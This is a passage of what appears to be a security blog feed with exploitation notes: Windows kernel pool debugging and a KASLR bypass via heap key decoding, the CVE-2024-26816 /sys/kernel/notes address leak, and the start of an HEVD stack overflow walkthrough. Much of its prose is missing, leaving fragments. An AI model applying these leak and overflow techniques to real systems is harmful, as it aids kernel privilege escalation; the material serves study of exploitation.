class="line">*ffff8981621a6000 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated) *Luci</span><br><span class="line">Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> ffff8981621a6450 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  NpFr Process: ffff898162043080</span><br><span class="line"> ffff8981621a68a0 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  NpFr Process: ffff898162043080</span><br></pre></td></tr></table></figure><p>pipeheader</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>: kd&gt; dq ffff8981621a6450</span><br><span class="line">ffff8981`<span class="number">621</span>a6450  <span class="number">7246704</span>e`<span class="number">0</span>a446f00 f7ca3fb8`<span class="number">9f</span>7f4811</span><br><span class="line">ffff8981`<span class="number">621</span>a6460  ffffcc05`<span class="number">0f</span>d259b8 ffffcc05`<span class="number">0f</span>d259b8</span><br><span class="line">ffff8981`<span class="number">621</span>a6470  <span class="number">00000000</span>`<span class="number">00000000</span> ffffcc05`<span class="number">10</span>a100f0</span><br><span class="line">ffff8981`<span class="number">621</span>a6480  <span class="number">000003</span>d0`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">000003</span>d0</span><br><span class="line">ffff8981`<span class="number">621</span>a6490  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8981`<span class="number">621</span>a64a0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8981`<span class="number">621</span>a64b0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8981`<span class="number">621</span>a64c0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dq ffff8387c055d450</span><br><span class="line">ffff8387`c055d450  <span class="number">7246704</span>e`<span class="number">0</span>a440000 <span class="number">330b</span>b4ed`<span class="number">16b</span>fc9f1</span><br><span class="line">ffff8387`c055d460  ffffc288`<span class="number">07372b</span>d8 ffffc288`<span class="number">07372b</span>d8</span><br><span class="line">ffff8387`c055d470  <span class="number">00000000</span>`<span class="number">00000000</span> ffffc288`<span class="number">05794910</span></span><br><span class="line">ffff8387`c055d480  <span class="number">00000000</span>`deadbeef <span class="number">00000000</span>`<span class="number">000003</span>d0</span><br><span class="line">ffff8387`c055d490  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8387`c055d4a0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8387`c055d4b0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8387`c055d4c0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br></pre></td></tr></table></figure><p>pipefreechunk</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PeekNamedPipe</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            HANDLE  hNamedPipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPVOID  lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            DWORD   nBufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPDWORD lpBytesRead,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPDWORD lpTotalBytesAvail,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPDWORD lpBytesLeftThisMessage</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>DataSizentbypass kaslr</p><ul><li>Page segment &#x3D; PipeQueueEntry &amp; 0xfffffffffff00000 (Segment mask) </li><li>Signature of Page segment &#x3D; readmem(Page segment + 0x10) </li><li>Segcontext &#x3D; (Page segment) ^ (Signature of Page segment) ^ RtlpHpHeapGlobals.HeapKey ^ 0xA2E64EADA2E64EAD </li><li>Segment heap &#x3D; Segcontext - 0x100</li><li>callback function: Segment heap-&gt;VsContextRtlpHpHeapGlobals.HeapKey ^ encode data ^ VsContext address</li></ul><p>EntryType unbufferIrpIrp</p><p>systemtoken</p><h3 id="API-"><a href="#API-" class="headerlink" title="API "></a>API </h3><p>Windows nativesystem servicesroutines  </p><p>Ke  kernelAPI  </p><p>Nt  Windows New Technology Windows API NtUser ModeAPICreateFilentdll.dllNtCreateFile  </p><p>Zw  NtNt  NtZwKiSystemService previous access modeNtZwprevious mode</p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><ul><li><a href="https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/">Exploiting Reversing (ER) series: article 01  Exploit Reversing</a></li><li><a href="https://exploitreversing.com/2024/01/03/exploiting-reversing-er-series-article-02/">Exploiting Reversing (ER) series: article 02  Exploit Reversing</a></li><li><a href="https://www.slideshare.net/">Share &amp; Discover Presentations</a></li><li><a href="https://www.vergiliusproject.com/">windows undocumented structure: vergilius project</a></li><li><a href="http://windbg.info/doc/1-common-cmds.html">Windbg command: WinDbg.info</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELFNote-leak-kernel-base</title>
      <link href="/2024/04/15/ELFNote-leak-kernel-base/"/>
      <url>/2024/04/15/ELFNote-leak-kernel-base/</url>
      
        <content type="html"><![CDATA[<blockquote><p>CVE-2024-26816</p></blockquote><span id="more"></span><p> <code>/sys/kernel/notes</code>  <code>startup_xen</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">$ sudo grep startup_xen /proc/kallsyms</span><br><span class="line">ffffffff9fa94430 T startup_xen</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> -al /sys/kernel/notes     </span><br><span class="line">-r--r--r-- 1 root root 472 Apr 15 12:15 /sys/kernel/notes</span><br><span class="line"></span><br><span class="line">$ hexdump -C /sys/kernel/notes                                </span><br><span class="line">00000000  04 00 00 00 14 00 00 00  03 00 00 00 47 4e 55 00  |............GNU.|</span><br><span class="line">00000010  14 ef 14 05 a3 aa ad c2  53 c3 cc 95 80 be 45 a7  |........S.....E.|</span><br><span class="line">00000020  96 1f b5 51 06 00 00 00  04 00 00 00 01 01 00 00  |...Q............|</span><br><span class="line">00000030  4c 69 6e 75 78 00 00 00  00 00 00 00 06 00 00 00  |Linux...........|</span><br><span class="line">00000040  01 00 00 00 00 01 00 00  4c 69 6e 75 78 00 00 00  |........Linux...|</span><br><span class="line">00000050  00 00 00 00 04 00 00 00  08 00 00 00 12 00 00 00  |................|</span><br><span class="line">00000060  58 65 6e 00 00 00 40 1d  00 00 00 00 04 00 00 00  |Xen...@.........|</span><br><span class="line">00000070  06 00 00 00 06 00 00 00  58 65 6e 00 6c 69 6e 75  |........Xen.linu|</span><br><span class="line">00000080  78 00 00 00 04 00 00 00  04 00 00 00 07 00 00 00  |x...............|</span><br><span class="line">00000090  58 65 6e 00 32 2e 36 00  04 00 00 00 08 00 00 00  |Xen.2.6.........|</span><br><span class="line">000000a0  05 00 00 00 58 65 6e 00  78 65 6e 2d 33 2e 30 00  |....Xen.xen-3.0.|</span><br><span class="line">000000b0  04 00 00 00 08 00 00 00  03 00 00 00 58 65 6e 00  |............Xen.|</span><br><span class="line">000000c0  00 00 00 80 ff ff ff ff  04 00 00 00 08 00 00 00  |................|</span><br><span class="line">000000d0  0f 00 00 00 58 65 6e 00  00 00 00 00 80 00 00 00  |....Xen.........|</span><br><span class="line">000000e0  04 00 00 00 08 00 00 00  01 00 00 00 58 65 6e 00  |............Xen.|</span><br><span class="line">000000f0  30 44 a9 9f ff ff ff ff  04 00 00 00 15 00 00 00  |0D..............|</span><br><span class="line">00000100  0a 00 00 00 58 65 6e 00  21 77 72 69 74 61 62 6c  |....Xen.!writabl|</span><br><span class="line">00000110  65 5f 70 61 67 65 5f 74  61 62 6c 65 73 00 00 00  |e_page_tables...|</span><br><span class="line">00000120  04 00 00 00 04 00 00 00  09 00 00 00 58 65 6e 00  |............Xen.|</span><br><span class="line">00000130  79 65 73 00 04 00 00 00  10 00 00 00 0d 00 00 00  |<span class="built_in">yes</span>.............|</span><br><span class="line">00000140  58 65 6e 00 01 00 00 00  00 00 00 00 01 00 00 00  |Xen.............|</span><br><span class="line">00000150  00 00 00 00 04 00 00 00  04 00 00 00 10 00 00 00  |................|</span><br><span class="line">00000160  58 65 6e 00 01 00 00 00  04 00 00 00 08 00 00 00  |Xen.............|</span><br><span class="line">00000170  04 00 00 00 58 65 6e 00  00 00 00 00 00 00 00 00  |....Xen.........|</span><br><span class="line">00000180  04 00 00 00 08 00 00 00  02 00 00 00 58 65 6e 00  |............Xen.|</span><br><span class="line">00000190  00 00 54 9e ff ff ff ff  04 00 00 00 04 00 00 00  |..T.............|</span><br><span class="line">000001a0  11 00 00 00 58 65 6e 00  01 88 00 00 04 00 00 00  |....Xen.........|</span><br><span class="line">000001b0  08 00 00 00 08 00 00 00  58 65 6e 00 67 65 6e 65  |........Xen.gene|</span><br><span class="line">000001c0  72 69 63 00 04 00 00 00  04 00 00 00 0e 00 00 00  |ric.............|</span><br><span class="line">000001d0  58 65 6e 00 01 00 00 00                           |Xen.....|</span><br><span class="line">000001d8</span><br></pre></td></tr></table></figure><p><code>arch/x86/xen/xen-head.S</code> </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> XEN_ELFNOTE_ENTRY          1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_GUEST_OS,       .asciz <span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_GUEST_VERSION,  .asciz <span class="string">&quot;2.6&quot;</span>)</span><br><span class="line"><span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_XEN_VERSION,    .asciz <span class="string">&quot;xen-3.0&quot;</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_XEN_PV</span></span><br><span class="line"><span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_VIRT_BASE,      _ASM_PTR __START_KERNEL_map)</span><br><span class="line"><span class="comment">/* Map the p2m table to a 512GB-aligned user address. */</span></span><br><span class="line"><span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_INIT_P2M,       .<span class="built_in">quad</span> (PUD_SIZE * PTRS_PER_PUD))</span><br><span class="line"><span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_ENTRY,          _ASM_PTR startup_xen)</span><br><span class="line"><span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_FEATURES,       .ascii <span class="string">&quot;!writable_page_tables&quot;</span>)</span><br><span class="line"><span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_PAE_MODE,       .asciz <span class="string">&quot;yes&quot;</span>)</span><br><span class="line"><span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_L1_MFN_VALID,</span><br><span class="line">.quad _PAGE_PRESENT; .quad _PAGE_PRESENT)</span><br><span class="line"><span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_MOD_START_PFN,  .<span class="type">long</span> <span class="number">1</span>)</span><br><span class="line"><span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_PADDR_OFFSET,   _ASM_PTR <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>ELFNOTE:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __ASSEMBLER__</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Generate a structure with the same shape as Elf&#123;32,64&#125;_Nhdr (which</span></span><br><span class="line"><span class="comment"> * turn out to be the same size and shape), followed by the name and</span></span><br><span class="line"><span class="comment"> * desc data with appropriate padding.  The &#x27;desctype&#x27; argument is the</span></span><br><span class="line"><span class="comment"> * assembler pseudo op defining the type of the data e.g. .asciz while</span></span><br><span class="line"><span class="comment"> * &#x27;descdata&#x27; is the data itself e.g.  &quot;hello, world&quot;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * e.g. ELFNOTE(XYZCo, 42, .asciz, &quot;forty-two&quot;)</span></span><br><span class="line"><span class="comment"> *      ELFNOTE(XYZCo, 12, .long, 0xdeadbeef)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFNOTE_START(name, type, flags)\</span></span><br><span class="line"><span class="meta">.pushsection .note.name, flags,@note;\</span></span><br><span class="line"><span class="meta">  .balign 4;\</span></span><br><span class="line"><span class="meta">  .long 2f - 1f<span class="comment">/* namesz */</span>;\</span></span><br><span class="line"><span class="meta">  .long 4484f - 3f<span class="comment">/* descsz */</span>;\</span></span><br><span class="line"><span class="meta">  .long type;\</span></span><br><span class="line"><span class="meta">1:.asciz #name;\</span></span><br><span class="line"><span class="meta">2:.balign 4;\</span></span><br><span class="line"><span class="meta">3:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFNOTE_END\</span></span><br><span class="line"><span class="meta">4484:.balign 4;\</span></span><br><span class="line"><span class="meta">.popsection;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFNOTE(name, type, desc)\</span></span><br><span class="line"><span class="meta">ELFNOTE_START(name, type, <span class="string">&quot;a&quot;</span>)\</span></span><br><span class="line"><span class="meta">desc;\</span></span><br><span class="line"><span class="meta">ELFNOTE_END</span></span><br></pre></td></tr></table></figure><p> <code>CONFIG_XEN_PV=y</code>  <code>startup_xen</code> \</p><ul><li>type: <code>1</code></li><li>name: <code>Xen</code></li></ul><p>Notes (Nhdr)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">   Elf32_Word n_namesz;</span><br><span class="line">   Elf32_Word n_descsz;</span><br><span class="line">   Elf32_Word n_type;</span><br><span class="line">&#125; Elf32_Nhdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">   Elf64_Word n_namesz;</span><br><span class="line">   Elf64_Word n_descsz;</span><br><span class="line">   Elf64_Word n_type;</span><br><span class="line">&#125; Elf64_Nhdr;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Nhdr</span><br><span class="line">name</span><br><span class="line">desc</span><br></pre></td></tr></table></figure><p>patch</p><ul><li><a href="https://lore.kernel.org/linux-hardening/202402180028.6DB512C50@keescook/">Re: [RESEND RFC] kernel&#x2F;ksysfs.c: restrict &#x2F;sys&#x2F;kernel&#x2F;notes to root access - Kees Cook</a></li></ul><p>KASLR</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="https://github.com/advisories/GHSA-mw3g-jr7f-3gg4">CVE-2024-26816  GitHub Advisory Database</a></li><li><a href="https://lwn.net/Articles/962782/">When ELF notes reveal too much [LWN.net]</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HEVD-StackOverFlow</title>
      <link href="/2024/04/03/HEVD-StackOverFlow/"/>
      <url>/2024/04/03/HEVD-StackOverFlow/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><p><a href="https://github.com/Ha0-Y/HEVDExploits">HEVDExploits</a></p><h2 id="Without-GS"><a href="#Without-GS" class="headerlink" title="Without GS"></a>Without GS</h2><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222003</span>:</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>);</span><br><span class="line">FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">BufferOverflowStackIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">v7 = <span class="string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>Ioctl</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">BufferOverflowStackIoctlHandler</span><span class="params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *Type3InputBuffer; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> InputBufferLength; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  Type3InputBuffer = IrpSp-&gt;Parameters.DeviceIoControl.Type3InputBuffer;</span><br><span class="line">  result = <span class="number">3221225473</span>i64;</span><br><span class="line">  InputBufferLength = IrpSp-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">  <span class="keyword">if</span> ( Type3InputBuffer )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">TriggerBufferOverflowStack</span>(Type3InputBuffer, InputBufferLength);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">TriggerBufferOverflowStack</span><span class="params">(<span class="type">void</span> *UserBuffer, <span class="type">size_t</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> KernelBuffer[<span class="number">512</span>]; <span class="comment">// [rsp+20h] [rbp-818h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(KernelBuffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(KernelBuffer));</span><br><span class="line">  <span class="built_in">ProbeForRead</span>(UserBuffer, <span class="number">0x800</span>ui64, <span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer Size: 0x%zX\n&quot;</span>, Size);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, KernelBuffer);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer Size: 0x%zX\n&quot;</span>, <span class="number">0x800</span>ui64);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memmove</span>(KernelBuffer, UserBuffer, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ProbeForRead</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ProbeForRead</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">const</span> <span class="keyword">volatile</span> VOID *Address,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T              Length,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG               Alignment</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>cookieexception</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PAGE:<span class="number">00000001400866</span>AE                 call    memmove</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>3                 jmp     <span class="type">short</span> loc_1400866D0</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>3 ;   &#125; <span class="comment">// starts at 14008661E</span></span><br><span class="line">PAGE:<span class="number">00000001400866B</span>5 ; ---------------------------------------------------------------------------</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>5</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>5 $LN6_0:                                 ; DATA XREF: .rdata:<span class="number">000000014000269</span>Co</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>5 ;   __except(<span class="number">1</span>) <span class="comment">// owned by 14008661E</span></span><br><span class="line">PAGE:<span class="number">00000001400866B</span>5                 mov     ebx, eax</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>7                 mov     r9d, eax</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>A                 lea     r8, aExceptionCode0 ; <span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span></span><br><span class="line">PAGE:<span class="number">00000001400866</span>C1                 mov     edx, <span class="number">3</span>          ; Level</span><br><span class="line">PAGE:<span class="number">00000001400866</span>C6                 lea     ecx, [Size+<span class="number">4</span>Ah] ; ComponentId</span><br><span class="line">PAGE:<span class="number">00000001400866</span>C9                 call    cs:__imp_DbgPrintEx</span><br><span class="line">PAGE:<span class="number">00000001400866</span>CF                 nop</span><br><span class="line">PAGE:<span class="number">00000001400866</span>D0</span><br><span class="line">PAGE:<span class="number">00000001400866</span>D0 loc_1400866D0:                          ; CODE XREF: TriggerBufferOverflowStack+CFj</span><br><span class="line">PAGE:<span class="number">00000001400866</span>D0                 mov     eax, ebx</span><br><span class="line">PAGE:<span class="number">00000001400866</span>D2                 lea     r11, [rsp+<span class="number">838</span>h+var_18]</span><br><span class="line">PAGE:<span class="number">00000001400866</span>DA                 mov     rbx, [r11+<span class="number">20</span>h]</span><br><span class="line">PAGE:<span class="number">00000001400866</span>DE                 mov     rsi, [r11+<span class="number">28</span>h]</span><br><span class="line">PAGE:<span class="number">00000001400866E2</span>                 mov     rdi, [r11+<span class="number">30</span>h]</span><br><span class="line">PAGE:<span class="number">00000001400866E6</span>                 mov     rsp, r11</span><br><span class="line">PAGE:<span class="number">00000001400866E9</span>                 pop     r15</span><br><span class="line">PAGE:<span class="number">00000001400866</span>EB                 pop     r14</span><br><span class="line">PAGE:<span class="number">00000001400866</span>ED                 pop     r12</span><br><span class="line">PAGE:<span class="number">00000001400866</span>EF                 retn</span><br><span class="line">PAGE:<span class="number">00000001400866</span>EF ; &#125; <span class="comment">// starts at 1400865E4</span></span><br></pre></td></tr></table></figure><p>IDA</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000818 KernelBuffer    <span class="built_in">dd</span> 512 dup(?)</span><br><span class="line">-0000000000000018 var_18          db ?</span><br><span class="line">-0000000000000017                 db ? ; undefined</span><br><span class="line">-0000000000000016                 db ? ; undefined</span><br><span class="line">-0000000000000015                 db ? ; undefined</span><br><span class="line">-0000000000000014                 db ? ; undefined</span><br><span class="line">-0000000000000013                 db ? ; undefined</span><br><span class="line">-0000000000000012                 db ? ; undefined</span><br><span class="line">-0000000000000011                 db ? ; undefined</span><br><span class="line">-0000000000000010                 db ? ; undefined</span><br><span class="line">-000000000000000F                 db ? ; undefined</span><br><span class="line">-000000000000000E                 db ? ; undefined</span><br><span class="line">-000000000000000D                 db ? ; undefined</span><br><span class="line">-000000000000000C                 db ? ; undefined</span><br><span class="line">-000000000000000B                 db ? ; undefined</span><br><span class="line">-000000000000000A                 db ? ; undefined</span><br><span class="line">-0000000000000009                 db ? ; undefined</span><br><span class="line">-0000000000000008                 db ? ; undefined</span><br><span class="line">-0000000000000007                 db ? ; undefined</span><br><span class="line">-0000000000000006                 db ? ; undefined</span><br><span class="line">-0000000000000005                 db ? ; undefined</span><br><span class="line">-0000000000000004                 db ? ; undefined</span><br><span class="line">-0000000000000003                 db ? ; undefined</span><br><span class="line">-0000000000000002                 db ? ; undefined</span><br><span class="line">-0000000000000001                 